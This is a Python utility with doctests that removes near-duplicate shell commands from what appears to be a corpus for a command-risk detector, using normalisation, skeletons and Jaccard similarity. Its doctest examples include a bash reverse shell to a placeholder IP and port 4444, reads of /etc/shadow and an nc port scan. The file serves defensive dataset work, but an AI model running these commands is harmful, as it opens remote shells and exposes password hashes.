#!/usr/bin/env python
# -*- coding: ascii -*-
"""Normalized near-duplicate dedup shared by the variant generators.
The caliber is the audit one: norm() placeholder collapse, skeleton() quoted-string
collapse, Jaccard on normalized token sets within one primary signal
class, threshold 0.8.

NearDupGate seeds from the existing corpus and screens every candidate:
a skeleton already seen anywhere is rejected (skeleton equality is coarser
than norm equality, so this also kills cross-class normalization-identical
groups), and a candidate whose token Jaccard against any same-class case
(existing or already accepted) reaches JACCARD_LIMIT is rejected.
"""

import re

JACCARD_LIMIT = 0.8


def norm(cmd):
    """Audit norm(): lowercase, placeholder collapse, whitespace squeeze.

    >>> norm("touch -t 202001010000 /tmp/qinjing-a.log")
    'touch -t HEX PATH'
    >>> norm("nc -z -w 2 203.0.113.10 80")
    'nc -z -w N IP N'
    """
    s = cmd.lower()
    s = re.sub(r"203\.0\.113\.\d+", "IP", s)
    s = re.sub(r"0x[0-9a-f]+", "HEX", s)
    s = re.sub(r"\b[0-9a-f]{8,}\b", "HEX", s)
    s = re.sub(r"/tmp/qinjing-[a-z0-9_./-]+", "PATH", s)
    s = re.sub(r"\b\d+(\.\d+)?\b", "N", s)
    s = re.sub(r"\s+", " ", s).strip()
    return s


def skeleton(cmd):
    """Audit skeleton(): norm() plus quoted-string collapse.

    >>> skeleton("bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'")
    'bash -c STR'
    """
    s = norm(cmd)
    s = re.sub(r"'[^']*'", "STR", s)
    s = re.sub(r'"[^"]*"', "STR", s)
    return s


def toks(cmd):
    """Audit toks(): the normalized token set Jaccard runs on.

    >>> toks("nc -z -w 2 203.0.113.10 80") == {'nc', '-z', '-w', 'N', 'IP'}
    True
    """
    return set(norm(cmd).split())


def jaccard(a, b):
    """Jaccard on two token sets; empty sets score 0 (audit skips them).

    >>> jaccard({'a', 'b'}, {'a', 'b', 'c'})
    0.6666666666666666
    >>> jaccard(set(), {'a'})
    0.0
    """
    if not a or not b:
        return 0.0
    return len(a & b) / len(a | b)


class NearDupGate:
    """Skeleton dedup (global) + intra-class Jaccard cap for one batch.

    Seed with the existing corpus cases (dicts with cmd and
    expected_signals); screen candidates with check(), register accepted
    ones with accept(). check() returns None for a pass, else a reason.

    >>> g = NearDupGate([
    ...     {"cmd": "head -5 /etc/shadow",
    ...      "expected_signals": ["credential_file_read"]},
    ...     {"cmd": "nc -z -w 2 203.0.113.10 80",
    ...      "expected_signals": ["net_scan_external"]}])
    >>> g.check("head -9 /etc/shadow", "credential_file_read")
    'skeleton duplicate: head -N /etc/shadow'
    >>> g.check("head -5 /etc/shadow", "credential_dump_shadow")
    'skeleton duplicate: head -N /etc/shadow'
    >>> g.check("nc -z -w 2 203.0.113.10 80 443", "net_scan_external")
    'jaccard 1.00 vs nc -z -w 2 203.0.113.10 80'
    >>> g.check("sed -n '1,5p' /etc/shadow", "credential_file_read") is None
    True
    >>> g.accept("sed -n '1,5p' /etc/shadow", "credential_file_read")
    >>> g.check("sed -n '1,9p' /etc/shadow", "credential_file_read")
    'skeleton duplicate: sed -n STR /etc/shadow'
    """

    def __init__(self, existing=()):
        self._skeletons = {}
        self._class_toks = {}
        for case in existing:
            cmd = case.get("cmd", "")
            if not cmd:
                continue
            es = case.get("expected_signals") or []
            self._register(cmd, es[0] if es else "(gap)", cmd)

    def _register(self, cmd, klass, label):
        self._skeletons.setdefault(skeleton(cmd), label)
        self._class_toks.setdefault(klass, []).append((toks(cmd), label))

    def check(self, cmd, klass):
        skel = skeleton(cmd)
        if skel in self._skeletons:
            return "skeleton duplicate: %s" % skel
        ta = toks(cmd)
        for tb, label in self._class_toks.get(klass, ()):
            j = jaccard(ta, tb)
            if j >= JACCARD_LIMIT:
                return "jaccard %.2f vs %s" % (j, label[:60])
        return None

    def accept(self, cmd, klass):
        self._register(cmd, klass, cmd)


def skeleton_report(per_class):
    """Per-class distinct-skeleton / case counts for a generated batch.

    per_class maps class name to a list of cmd strings. Returns report
    lines sorted by class name (the numbers ship with the
    batch so acceptance can check them without rerunning the audit).

    >>> for line in skeleton_report({"b": ["id", "id -u"], "a": ["w"]}):
    ...     print(line)
    a skeletons=1 cases=1
    b skeletons=2 cases=2
    """
    lines = []
    for klass in sorted(per_class):
        cmds = per_class[klass]
        lines.append("%s skeletons=%d cases=%d"
                     % (klass, len({skeleton(c) for c in cmds}), len(cmds)))
    return lines


if __name__ == "__main__":
    import doctest
    import sys
    result = doctest.testmod()
    sys.exit(1 if result.failed else 0)